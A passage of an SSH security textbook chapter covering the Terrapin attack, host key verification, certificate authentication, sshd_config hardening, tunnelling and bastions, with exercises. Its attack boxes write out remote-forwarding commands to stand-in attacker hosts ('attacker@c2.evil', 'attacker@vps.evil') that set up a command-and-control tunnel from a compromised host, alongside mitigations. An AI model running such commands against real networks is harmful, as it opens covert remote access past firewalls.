+<p>The attack works because the SSH binary packet protocol initialises the sequence number to zero at the start of each direction independently and increments it per packet, but the sequence number is not itself cryptographically bound during the initial handshake phase before keys are derived. An active MITM positioned between client and server can inject or delete a controlled number of messages during the unencrypted handshake prologue (the version string exchange and <code>KEXINIT</code> messages) without the other party detecting the manipulation. After rekeying, the sequence numbers on each side are off by the number of injected or deleted messages. This offset breaks the synchronisation that AEAD nonces depend on for ChaCha20-Poly1305 and undermines the integrity guarantee of EtM MACs.</p>
+<p>In practice the most serious consequence is the ability to downgrade the client’s offered host key algorithms or extension negotiation results. For example, an attacker could suppress the <code>ext-info-c</code> extension that enables RSA-SHA2 algorithm negotiation, forcing a fall-back to weaker RSA-SHA1 signatures for host key verification without either side raising an error.</p>
+<div class="parahead">
+<p>Fix: Strict KEX Extension.</p>
+</div>
+<p>OpenSSH 9.6 (released December 2023 alongside the disclosure) introduced the <code>kex-strict-c-v00@openssh.com</code> and <code>kex-strict-s-v00@openssh.com</code> extension negotiation flags. When both client and server advertise strict KEX, the protocol resets the sequence number to zero immediately after the first key exchange completes and cryptographically binds the handshake transcript so that any injected or deleted message causes a MAC verification failure. Strict KEX is backward compatible: if either side does not advertise it, the session falls back to the old behaviour. Upgrading both client and server to OpenSSH 9.6 or later is the complete fix; patching only one side provides partial protection. Distributions that cannot upgrade immediately should remove <code>chacha20-poly1305</code> and EtM cipher modes from <code>sshd_config</code> as a temporary workaround, though this degrades security in other respects.</p>
+<h2 id="sec-ssh-host-keys"><span class="secnum">17.3</span> Host Key Verification<a class="headerlink" href="#sec-ssh-host-keys" title="Permanent link">&para;</a></h2>
+<p>The server presents a <em>host key</em> to authenticate itself to the client, preventing man-in-the-middle attacks. Clients record host keys in <code> /.ssh/known_hosts</code>.</p>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.4 (Trust on First Use (TOFU))</p>
+<p>TOFU is the default SSH policy: on first connection the client displays the host key fingerprint and stores it in <code>known_hosts</code>. Subsequent connections verify the fingerprint matches. This provides no protection on the <em>first</em> connection, where a MITM could substitute a rogue key.</p>
+</div>
+<div class="admonition warning box-warningbox kind-safety">
+<p class="admonition-title">TOFU is Not Authentication</p>
+<p>TOFU defers the trust decision to a moment when users rarely verify fingerprints. Attackers performing ARP spoofing or DNS poisoning at initial connection time can establish a persistent MITM. For production infrastructure, use SSH certificate authorities or DNSSEC-signed SSHFP records instead.</p>
+</div>
+<p>Strict host checking prevents silent acceptance of changed keys:</p>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># ~/.ssh/config</span>
+Host<span class="w"> </span>*
+<span class="w">    </span>StrictHostKeyChecking<span class="w"> </span>yes
+<span class="w">    </span>HashKnownHosts<span class="w"> </span>yes
+</code></pre></div>
+<h2 id="sec-ssh-auth"><span class="secnum">17.4</span> Authentication Methods<a class="headerlink" href="#sec-ssh-auth" title="Permanent link">&para;</a></h2>
+<h3 id="1741-password-authentication"><span class="secnum">17.4.1</span> Password Authentication<a class="headerlink" href="#1741-password-authentication" title="Permanent link">&para;</a></h3>
+<p>Password authentication transmits the password encrypted inside the SSH tunnel. It’s vulnerable to brute force, credential stuffing, and phishing. Disable it on all public-facing servers.</p>
+<h3 id="1742-public-key-authentication"><span class="secnum">17.4.2</span> Public Key Authentication<a class="headerlink" href="#1742-public-key-authentication" title="Permanent link">&para;</a></h3>
+<p>The client proves possession of a private key corresponding to a public key listed in <code> /.ssh/authorized_keys</code>. The server sends a challenge; the client signs it with the private key.</p>
+<div class="admonition info box-keybox kind-concept">
+<p class="admonition-title">Recommended Key Types</p>
+<ul>
+<li>
+<p><strong>Ed25519</strong> – 256-bit EdDSA on Curve25519; fast, compact, and resistant to weak RNG attacks. <strong>Preferred.</strong></p>
+</li>
+<li>
+<p><strong>ECDSA (P-256/P-384)</strong> – Acceptable; avoid P-521 for compatibility.</p>
+</li>
+<li>
+<p><strong>RSA-4096</strong> – Legacy interoperability only; prefer Ed25519.</p>
+</li>
+<li>
+<p><strong>DSA</strong> – Broken; do not use.</p>
+</li>
+</ul>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># Generate key pair</span>
+ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-C<span class="w"> </span><span class="s2">"alice@workstation"</span><span class="w"> </span>-f<span class="w"> </span>~/.ssh/id_ed25519
+
+<span class="c1"># Deploy public key to server</span>
+ssh-copy-id<span class="w"> </span>-i<span class="w"> </span>~/.ssh/id_ed25519.pub<span class="w"> </span>user@server.example.com
+
+<span class="c1"># Verify authorized_keys entry</span>
+cat<span class="w"> </span>~/.ssh/authorized_keys
+<span class="c1"># ssh-ed25519 AAAA... alice@workstation</span>
+</code></pre></div>
+<h3 id="sec-ssh-certificates"><span class="secnum">17.4.3</span> SSH Certificate-Based Authentication<a class="headerlink" href="#sec-ssh-certificates" title="Permanent link">&para;</a></h3>
+<p>SSH certificates extend public key authentication with a CA model, eliminating TOFU for both host and user authentication.</p>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.5 (SSH Certificate Authority)</p>
+<p>An SSH CA is an ordinary key pair (typically Ed25519) whose public key is distributed via configuration. The CA signs user or host public keys, embedding validity period, principals, and extensions into a certificate. Clients and servers trust certificates signed by a configured CA, removing the need to distribute individual public keys.</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># Generate CA key (keep private key offline or in HSM)</span>
+ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-f<span class="w"> </span>/etc/ssh/ca_user_key<span class="w"> </span>-C<span class="w"> </span><span class="s2">"UserCA"</span>
+ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-f<span class="w"> </span>/etc/ssh/ca_host_key<span class="w"> </span>-C<span class="w"> </span><span class="s2">"HostCA"</span>
+
+<span class="c1"># Sign a user public key: valid 8h, for principal "alice"</span>
+ssh-keygen<span class="w"> </span>-s<span class="w"> </span>/etc/ssh/ca_user_key<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-I<span class="w"> </span><span class="s2">"alice@laptop-2024"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-n<span class="w"> </span>alice<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-V<span class="w"> </span>+8h<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>~/.ssh/id_ed25519.pub
+<span class="c1"># Produces: ~/.ssh/id_ed25519-cert.pub</span>
+
+<span class="c1"># Sign a host public key: valid 52 weeks</span>
+ssh-keygen<span class="w"> </span>-s<span class="w"> </span>/etc/ssh/ca_host_key<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-I<span class="w"> </span><span class="s2">"web01.example.com"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-h<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>-V<span class="w"> </span>+52w<span class="w"> </span><span class="se">\</span>
+<span class="w">           </span>/etc/ssh/ssh_host_ed25519_key.pub
+
+<span class="c1"># sshd_config: trust the host CA (eliminates TOFU)</span>
+<span class="c1"># TrustedUserCAKeys /etc/ssh/ca_user_key.pub</span>
+<span class="c1"># HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub</span>
+</code></pre></div>
+<h4 id="why-ssh-cas-beat-authorized_keys-at-scale">Why SSH CAs Beat <code>authorized_keys</code> at Scale<a class="headerlink" href="#why-ssh-cas-beat-authorized_keys-at-scale" title="Permanent link">&para;</a></h4>
+<p>Managing <code>authorized_keys</code> across hundreds of servers is painful. Adding a new engineer requires touching every server they need access to. Revoking access when someone leaves requires the same sweep, and a single missed server leaves a live credential. SSH certificate authorities solve both problems by inverting the trust model.</p>
+<p>Instead of distributing individual public keys to servers, you distribute a single CA public key to every server’s <code>TrustedUserCAKeys</code> file. When the server receives a connection, it checks whether the client’s certificate is signed by a trusted CA and whether the requested login name matches one of the certificate’s <em>principals</em> — the list of Unix usernames the certificate is valid for (e.g., <code>-n alice,deploy</code>). No per-user entry is needed anywhere on the server.</p>
+<p>Revocation is equally clean. Revoking the CA key invalidates every certificate it ever signed — a nuclear option for a security incident where the CA private key is compromised. For individual certificate revocation (e.g., a specific user’s certificate was stolen), OpenSSH supports a <code>RevokedKeys</code> file or a key revocation list (KRL) via <code>ssh-keygen -k</code> that servers consult before accepting a certificate.</p>
+<div class="parahead">
+<p>Short-lived certificates and JIT access.</p>
+</div>
+<p>The most secure pattern issues certificates that are valid for the duration of a work session — 8 to 12 hours — and requires re-authentication through the CA each day. Tools like Hashicorp Vault SSH Secrets Engine, Netflix BLESS, and Teleport automate this: a user authenticates to the CA backend (with MFA), receives a signed certificate scoped to the production principals they need, uses it for the day, and has no persistent credential afterward. The server needs no revocation check: if the certificate is expired, it’s rejected. This eliminates the standing-access problem that makes long-lived SSH keys attractive to attackers doing lateral movement.</p>
+<h2 id="sec-ssh-kex-diagram"><span class="secnum">17.5</span> Key Exchange Diagram<a class="headerlink" href="#sec-ssh-kex-diagram" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-ssh-handshake">
+<img class="tikz" src="img/tikz-2f8669ffab5e.svg" alt="Simplified SSH-2 handshake: version exchange, algorithm negotiation, key exchange, and authentication." loading="lazy" width="353" height="177">
+<figcaption><strong>Figure 17.1.</strong> Simplified SSH-2 handshake: version exchange, algorithm negotiation, key exchange, and authentication.</figcaption>
+</figure>
+<h2 id="sec-ssh-hardening"><span class="secnum">17.6</span> Hardening <code>sshd_config</code><a class="headerlink" href="#sec-ssh-hardening" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># /etc/ssh/sshd_config  -- hardened template</span>
+
+Protocol<span class="w"> </span><span class="m">2</span>
+Port<span class="w"> </span><span class="m">22</span><span class="w">  </span><span class="c1"># Consider non-standard port + port-knock for obscurity</span>
+
+<span class="c1"># Host keys: Ed25519 only</span>
+<span class="w"> </span>HostKey<span class="w"> </span>/etc/ssh/ssh_host_ed25519_key
+
+<span class="c1"># KEX / Cipher / MAC allowlists</span>
+KexAlgorithms<span class="w"> </span>curve25519-sha256,sntrup761x25519-sha512@openssh.com
+Ciphers<span class="w"> </span>chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
+MACs<span class="w"> </span>hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
+
+<span class="c1"># Authentication</span>
+PermitRootLogin<span class="w"> </span>no
+PasswordAuthentication<span class="w"> </span>no
+PubkeyAuthentication<span class="w"> </span>yes
+AuthorizedKeysFile<span class="w"> </span>.ssh/authorized_keys
+ChallengeResponseAuthentication<span class="w"> </span>no
+UsePAM<span class="w"> </span>yes
+MaxAuthTries<span class="w"> </span><span class="m">3</span>
+LoginGraceTime<span class="w"> </span><span class="m">30</span>
+
+<span class="c1"># Restrict access</span>
+AllowUsers<span class="w"> </span>alice<span class="w"> </span>bob<span class="w"> </span>deploy
+AllowGroups<span class="w"> </span>sshusers
+
+<span class="c1"># Session hardening</span>
+ClientAliveInterval<span class="w"> </span><span class="m">300</span>
+ClientAliveCountMax<span class="w"> </span><span class="m">2</span>
+TCPKeepAlive<span class="w"> </span>no
+
+<span class="c1"># Feature restrictions</span>
+X11Forwarding<span class="w"> </span>no
+AllowTcpForwarding<span class="w"> </span>no<span class="w">      </span><span class="c1"># Set to "local" if tunnels needed</span>
+AllowAgentForwarding<span class="w"> </span>no
+PermitTunnel<span class="w"> </span>no
+Banner<span class="w"> </span>/etc/ssh/banner.txt<span class="w"> </span><span class="c1"># Legal warning banner</span>
+</code></pre></div>
+<h4 id="directive-by-directive-rationale">Directive-by-Directive Rationale<a class="headerlink" href="#directive-by-directive-rationale" title="Permanent link">&para;</a></h4>
+<p>The directives in the hardened template are not cargo-culted defaults — each closes a specific attack vector. The following explains what each one does and why it matters.</p>
+<div class="parahead">
+<p><code>PermitRootLogin no</code>.</p>
+</div>
+<p>Remote root login combines the highest-privilege account with a predictable username, making it a primary brute-force target. Disabling it forces attackers to first compromise an unprivileged account and then escalate locally, adding a detection opportunity. On systems that require root access, a jump via <code>sudo</code> from a named account preserves the audit trail; remote root would leave only the source IP in logs with no user attribution.</p>
+<div class="parahead">
+<p><code>PasswordAuthentication no</code>.</p>
+</div>
+<p>Password authentication is vulnerable to brute force, credential stuffing from breached databases, and phishing. Disabling it forces public key authentication, which requires physical possession of the private key (and its passphrase, if set). This single directive eliminates the entire class of automated scanning attacks that probe SSH on TCP/22 — scanners immediately drop connections to servers that refuse password auth because there is nothing left to guess.</p>
+<div class="parahead">
+<p><code>AllowUsers</code> and <code>AllowGroups</code>.</p>
+</div>
+<p>Without an explicit allowlist, any local account can attempt SSH login. System accounts created by packages (e.g., <code>www-data</code>, <code>mysql</code>, <code>nobody</code>) shouldn’t have SSH access. <code>AllowUsers alice bob deploy</code> creates an explicit whitelist; any other account gets an “Access denied” at authentication regardless of key. On larger systems, <code>AllowGroups sshusers</code> is easier to maintain: add users to the group rather than editing <code>sshd_config</code> each time.</p>
+<div class="parahead">
+<p><code>MaxAuthTries 3</code>.</p>
+</div>
+<p>Limits authentication attempts per connection. After 3 failures the connection is closed. This rate-limits brute-force attacks without requiring external tooling, though <code>fail2ban</code> should still run as a complementary layer that blocks source IPs after repeated reconnects.</p>
+<div class="parahead">
+<p><code>LoginGraceTime 30</code>.</p>
+</div>
+<p>Closes unauthenticated connections that haven’t completed login within 30 seconds. Without this, an attacker can leave thousands of half-open connections, contributing to resource exhaustion. The default is 120 seconds — far too long for any legitimate use case.</p>
+<div class="parahead">
+<p><code>ClientAlive Interval</code> and <code>ClientAlive CountMax</code>.</p>
+</div>
+<p>Setting <code>ClientAlive­Interval 300</code> sends a keepalive probe over the encrypted channel every 300 seconds. <code>ClientAlive­CountMax 2</code> drops the connection after 2 missed probes — effectively a 10-minute idle timeout. Together they terminate abandoned sessions that might otherwise persist indefinitely and remain accessible if an attacker reuses the terminal window. Setting <code>TCPKeepAlive no</code> disables the less secure TCP-level keepalive (which operates below the encrypted channel and is spoofable) in favour of the application-level SSH mechanism.</p>
+<div class="parahead">
+<p><code>AllowAgentForwarding no</code>.</p>
+</div>
+<p>On a bastion or general-purpose server, forwarding the SSH agent socket means any root-level process on that server can impersonate the connecting user to any host that trusts their key. This is not theoretical: <code>SSH_AUTH_SOCK</code> is visible in <code>/proc/$pid/environ</code> for processes running as root. Disable globally and enable only for specific, explicitly trusted bastions in the client-side <code> /.ssh/config</code> when <code>ProxyJump</code> is not viable.</p>
+<div class="parahead">
+<p><code>Banner /etc/ssh/banner.txt</code>.</p>
+</div>
+<p>A pre-login legal warning is required by compliance frameworks (PCI DSS, HIPAA) and strengthens prosecutions under computer fraud statutes. The banner must state that the system is for authorised use only and that activity may be monitored. Without it, defence teams have less legal footing when pursuing unauthorised access cases.</p>
+<div class="tbl" id="tab-ssh-algorithms">
+<div class="tbl-caption"><strong>Table 17.1.</strong> SSH cipher, MAC, and KEX algorithm recommendations</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Category</strong></th>
+<th style="text-align: left;"><strong>Algorithm</strong></th>
+<th style="text-align: left;"><strong>Status</strong></th>
+<th style="text-align: left;"><strong>Notes</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">KEX</td>
+<td style="text-align: left;"><code>curve25519-sha256</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Recommended</td>
+<td style="text-align: left;">ECDH, 128-bit</td>
+</tr>
+<tr>
+<td style="text-align: left;">KEX</td>
+<td style="text-align: left;"><code>diffie-hellman-group16-sha512</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Acceptable</td>
+<td style="text-align: left;">4096-bit DH</td>
+</tr>
+<tr>
+<td style="text-align: left;">KEX</td>
+<td style="text-align: left;"><code>diffie-hellman-group14-sha256</code></td>
+<td style="text-align: left;"><span class="math inline">\(\sim\)</span> Legacy</td>
+<td style="text-align: left;">2048-bit DH</td>
+</tr>
+<tr>
+<td style="text-align: left;">KEX</td>
+<td style="text-align: left;"><code>diffie-hellman-group1-sha1</code></td>
+<td style="text-align: left;"><span class="math inline">\(\times\)</span> Broken</td>
+<td style="text-align: left;">Logjam-vuln</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cipher</td>
+<td style="text-align: left;"><code>chacha20-poly1305@openssh.com</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Recommended</td>
+<td style="text-align: left;">AEAD</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cipher</td>
+<td style="text-align: left;"><code>aes256-gcm@openssh.com</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Recommended</td>
+<td style="text-align: left;">AEAD</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cipher</td>
+<td style="text-align: left;"><code>aes256-ctr</code></td>
+<td style="text-align: left;"><span class="math inline">\(\sim\)</span> Acceptable</td>
+<td style="text-align: left;">Requires ETM MAC</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cipher</td>
+<td style="text-align: left;"><code>3des-cbc</code></td>
+<td style="text-align: left;"><span class="math inline">\(\times\)</span> Broken</td>
+<td style="text-align: left;">SWEET32</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cipher</td>
+<td style="text-align: left;"><code>arcfour</code></td>
+<td style="text-align: left;"><span class="math inline">\(\times\)</span> Broken</td>
+<td style="text-align: left;">RC4</td>
+</tr>
+<tr>
+<td style="text-align: left;">MAC</td>
+<td style="text-align: left;"><code>hmac-sha2-256-etm@openssh.com</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Recommended</td>
+<td style="text-align: left;">ETM ordering</td>
+</tr>
+<tr>
+<td style="text-align: left;">MAC</td>
+<td style="text-align: left;"><code>hmac-sha2-512-etm@openssh.com</code></td>
+<td style="text-align: left;"><span class="math inline">\(✓\)</span> Recommended</td>
+<td style="text-align: left;">ETM ordering</td>
+</tr>
+<tr>
+<td style="text-align: left;">MAC</td>
+<td style="text-align: left;"><code>hmac-sha1</code></td>
+<td style="text-align: left;"><span class="math inline">\(\times\)</span> Broken</td>
+<td style="text-align: left;">SHA-1 collision</td>
+</tr>
+<tr>
+<td style="text-align: left;">MAC</td>
+<td style="text-align: left;"><code>hmac-md5</code></td>
+<td style="text-align: left;"><span class="math inline">\(\times\)</span> Broken</td>
+<td style="text-align: left;">MD5 broken</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+<h2 id="sec-ssh-tunneling"><span class="secnum">17.7</span> SSH Tunneling<a class="headerlink" href="#sec-ssh-tunneling" title="Permanent link">&para;</a></h2>
+<p>SSH can forward arbitrary TCP streams through the encrypted channel, providing a VPN-like capability. This is both a legitimate tool and a favourite attacker technique for bypassing egress controls.</p>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.6 (Local Port Forwarding (<code>-L</code>))</p>
+<p>Binds a port on the local machine; connections are forwarded through the SSH server to a target host and port reachable from the server. <code>ssh -L 8080:internal.example.com:80 user@bastion.example.com</code></p>
+</div>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.7 (Remote Port Forwarding (<code>-R</code>))</p>
+<p>Binds a port on the <em>remote</em> SSH server; connections are forwarded back to the local machine or a target reachable from it. Attackers use this to expose internal services: <code>ssh -R 4444:localhost:4444 attacker@c2.evil</code>.</p>
+</div>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.8 (Dynamic SOCKS5 Proxy (<code>-D</code>))</p>
+<p>Creates a SOCKS5 proxy on the local machine; all traffic routed through the proxy is forwarded via the SSH server to any destination. This effectively provides a VPN through any open SSH port. <code>ssh -D 1080 user@bastion.example.com</code></p>
+</div>
+<div class="admonition warning box-attackbox kind-safety">
+<p class="admonition-title">SSH as C2 Tunnel</p>
+<p>Attackers with a compromised internal host may use remote port forwarding to establish a persistent command-and-control channel through the firewall:</p>
+<ol>
+<li>
+<p>Malware on internal host connects <em>outbound</em> on TCP/22 to attacker’s VPS (typically allowed by egress rules).</p>
+</li>
+<li>
+<p><code>ssh -R 2222:localhost:22 attacker@vps.evil</code> exposes the compromised host’s SSH on the VPS.</p>
+</li>
+<li>
+<p>Attacker SSHes to <code>localhost:2222</code> on the VPS to control the internal host from any network.</p>
+</li>
+</ol>
+<p>Mitigations: restrict <code>AllowTcpForwarding</code> in <code>sshd_config</code>; block outbound TCP/22 except to known bastions; monitor for long-lived SSH connections.</p>
+</div>
+<h2 id="sec-ssh-jump"><span class="secnum">17.8</span> Jump Hosts and ProxyJump<a class="headerlink" href="#sec-ssh-jump" title="Permanent link">&para;</a></h2>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.9 (Jump Host (Bastion))</p>
+<p>A bastion host is a hardened, network-accessible server that acts as the sole entry point into a protected segment. Users SSH to the bastion, then hop to internal targets. ProxyJump handles this transparently without opening a shell on the intermediate host.</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># Single hop</span>
+ssh<span class="w"> </span>-J<span class="w"> </span>alice@bastion.example.com<span class="w"> </span>user@10.0.1.50
+
+<span class="c1"># Chained hops (bastion -&gt; jump2 -&gt; target)</span>
+ssh<span class="w"> </span>-J<span class="w"> </span>alice@bastion.example.com,bob@jump2.internal<span class="w"> </span>user@10.0.2.99
+
+<span class="c1"># ~/.ssh/config equivalent (preferred for daily use)</span>
+Host<span class="w"> </span>internal-*
+<span class="w">    </span>ProxyJump<span class="w"> </span>alice@bastion.example.com
+<span class="w">    </span>User<span class="w"> </span>deploy
+<span class="w">    </span>IdentityFile<span class="w"> </span>~/.ssh/id_ed25519
+
+Host<span class="w"> </span>bastion.example.com
+<span class="w">    </span>HostName<span class="w"> </span><span class="m">203</span>.0.113.10
+<span class="w">    </span>User<span class="w"> </span>alice
+<span class="w">    </span>IdentityFile<span class="w"> </span>~/.ssh/id_ed25519
+</code></pre></div>
+<div class="admonition warning box-warningbox kind-safety">
+<p class="admonition-title">Agent Forwarding Security Risk</p>
+<p><code>ForwardAgent yes</code> forwards the SSH agent socket to the remote host. A root user on that host can use the forwarded socket to authenticate to <em>any</em> host that trusts your key—without ever obtaining your private key. Always prefer <code>ProxyJump</code> over agent forwarding. If agent forwarding is required, limit it to trusted hosts in <code> /.ssh/config</code>: <code>Host trusted-bastion; ForwardAgent yes</code>.</p>
+</div>
+<h4 id="how-proxyjump-works-mechanically">How ProxyJump Works Mechanically<a class="headerlink" href="#how-proxyjump-works-mechanically" title="Permanent link">&para;</a></h4>
+<p><code>ProxyJump</code> (or the older <code>ProxyCommand</code> with <code>ssh -W</code>) works by having the SSH client establish a connection to the jump host, then ask the jump host to open a TCP channel to the target host. The client’s SSH session to the <em>target</em> runs entirely inside that forwarded channel. Crucially, the client negotiates a <em>separate</em> TLS-like SSH session with the target, end-to-end from the client’s keyboard. The jump host sees only an opaque encrypted stream; it never decrypts the traffic destined for the target and it never receives the client’s private key material. This is fundamentally different from logging into the bastion and then running a second <code>ssh</code> command from there, which would expose credentials to the bastion.</p>
+<p>The old <code>ProxyCommand</code> approach required <code>ssh -W %h:%p</code> and was essentially the same mechanism with more syntax. OpenSSH 7.3 (2016) introduced <code>ProxyJump</code> as a cleaner alias. Both approaches work with <code>scp</code> and <code>sftp</code> through the <code>-J</code> flag.</p>
+<div class="parahead">
+<p>Bastion host hardening.</p>
+</div>
+<p>The bastion itself needs tight security because it’s the entry point to everything behind it. Key configuration choices:</p>
+<ul>
+<li>
+<p><code>AllowAgentForwarding no</code> on the bastion’s <code>sshd_config</code> — the bastion should never forward agent sockets to targets; <code>ProxyJump</code> makes this unnecessary.</p>
+</li>
+<li>
+<p><code>AllowTcpForwarding local</code> or <code>no</code> — <code>local</code> allows <code>ProxyJump</code> channels while blocking remote port forwarding that could be exploited to expose the bastion’s backend network.</p>
+</li>
+<li>
+<p>Permit no interactive shells on the bastion for service accounts; restrict to <code>ForceCommand</code> or <code>command=</code> in <code>authorized_keys</code>.</p>
+</li>
+<li>
+<p>Session recording with <code>tlog</code> or <code>sshaudit</code> to create an immutable audit trail of all bastion sessions.</p>
+</li>
+<li>
+<p>Rotate the bastion’s host key every 12 months and update <code>known_hosts</code> centrally to prevent stale-key MITM.</p>
+</li>
+</ul>
+<h2 id="sec-ssh-attacks"><span class="secnum">17.9</span> Common SSH Attacks and Defences<a class="headerlink" href="#sec-ssh-attacks" title="Permanent link">&para;</a></h2>
+<div class="admonition warning box-attackbox kind-safety">
+<p class="admonition-title">Brute Force and Credential Stuffing</p>
+<p>Automated tools (Hydra, Medusa) attempt thousands of username/password combinations against SSH. Defences:</p>
+<ul>
+<li>
+<p>Disable <code>PasswordAuthentication</code> – most effective control.</p>
+</li>
+<li>
+<p>Deploy fail2ban or SSHGuard to rate-limit failed attempts.</p>
+</li>
+<li>
+<p>Use a non-standard port to reduce log noise (obscurity, not a primary control).</p>
+</li>
+<li>
+<p>Require MFA (TOTP via <code>libpam-google-authenticator</code>) as a second factor even with keys.</p>
+</li>
+</ul>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># /etc/fail2ban/jail.local</span>
+<span class="o">[</span>sshd<span class="o">]</span>
+<span class="nv">enabled</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span>
+<span class="nv">port</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>ssh
+<span class="nv">filter</span><span class="w">   </span><span class="o">=</span><span class="w"> </span>sshd
+<span class="nv">logpath</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>/var/log/auth.log
+<span class="nv">maxretry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+<span class="nv">bantime</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="m">3600</span><span class="w">   </span><span class="p">;</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>hour<span class="w"> </span>ban
+<span class="nv">findtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">300</span><span class="w">    </span><span class="p">;</span><span class="w"> </span>within<span class="w"> </span><span class="m">5</span><span class="w"> </span>minutes
+</code></pre></div>
+<div class="admonition info box-definition kind-concept">
+<p class="admonition-title">Definition 17.10 (known_hosts MITM Attack)</p>
+<p>If an attacker can intercept the <em>first</em> SSH connection (e.g., via ARP spoofing), they can present their own host key. The victim’s client stores the attacker’s key. All subsequent sessions appear legitimate but are being decrypted by the attacker. SSHFP DNS records (RFC 4255) and SSH certificate authorities both mitigate first-connection MITM.</p>
+</div>
+<h2 id="sec-ssh-bastion"><span class="secnum">17.10</span> Bastion Architecture with Session Recording<a class="headerlink" href="#sec-ssh-bastion" title="Permanent link">&para;</a></h2>
+<p>Enterprise environments supplement SSH access control with session recording, providing an audit trail for privileged access.</p>
+<div class="language-bash highlight"><pre><span></span><code><span class="c1"># Install tlog on bastion (records terminal sessions to journal)</span>
+<span class="c1"># /etc/tlog/tlog-rec-session.conf</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="s2">"writer"</span>:<span class="w"> </span><span class="s2">"journal"</span>,
+<span class="w">  </span><span class="s2">"shell"</span>:<span class="w">  </span><span class="s2">"/bin/bash"</span>,
+<span class="w">  </span><span class="s2">"notice"</span>:<span class="w"> </span><span class="s2">"NOTICE: Session is being recorded."</span>
+<span class="o">}</span>
+
+<span class="c1"># Retrieve recorded session</span>
+tlog-play<span class="w"> </span>-r<span class="w"> </span>journal<span class="w"> </span>--since<span class="o">=</span><span class="s2">"2024-01-15 14:00:00"</span>
+
+<span class="c1"># Alternative: script-based recording in /etc/ssh/sshrc</span>
+<span class="nb">exec</span><span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>-f<span class="w"> </span>/var/log/sessions/<span class="k">$(</span>whoami<span class="k">)</span>-<span class="k">$(</span>date<span class="w"> </span>+
+</code></pre></div>
+<h2 id="sec-ssh-exercises"><span class="secnum">17.11</span> Exercises<a class="headerlink" href="#sec-ssh-exercises" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-exercise kind-example">
+<p class="admonition-title">Exercise 17.1</p>
+<p>A junior administrator has deployed an Ubuntu server with the following <code>sshd_config</code> settings: <code>PermitRootLogin yes</code>, <code>PasswordAuthentication yes</code>, <code>X11Forwarding yes</code>, and no <code>AllowUsers</code> directive. Identify all security issues and write a corrected configuration file that addresses each one.</p>
+</div>
+<div class="admonition example box-exercise kind-example">
+<p class="admonition-title">Exercise 17.2</p>
+<p>Explain the difference between SSH public key authentication and SSH certificate-based authentication. Under what circumstances would certificate authentication be preferable at scale, and what infrastructure is required to support it? What happens when a certificate expires and a user attempts to connect?</p>
+</div>
+<div class="admonition example box-exercise kind-example">
+<p class="admonition-title">Exercise 17.3</p>
+<p>An attacker has gained unprivileged shell access to an internal Linux host that sits behind a stateful firewall permitting only outbound TCP/22 traffic. Describe, step by step, how the attacker could use SSH remote port forwarding to establish a persistent C2 channel. What log entries would be generated, and what network-level controls would detect or block this technique?</p>
+</div>
+<div class="admonition example box-exercise kind-example">
+<p class="admonition-title">Exercise 17.4</p>
+<p>Your organisation runs 200 Linux servers. Currently each server’s <code>authorized_keys</code> file is managed manually. Propose a migration to SSH certificate-based authentication: describe the CA key management, certificate issuance workflow (including short-lived certificates for privileged access), server-side configuration, and revocation mechanism.</p>
+</div>
+</article>
+</div>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button type="button" class="md-top md-icon" data-md-component="top" hidden>
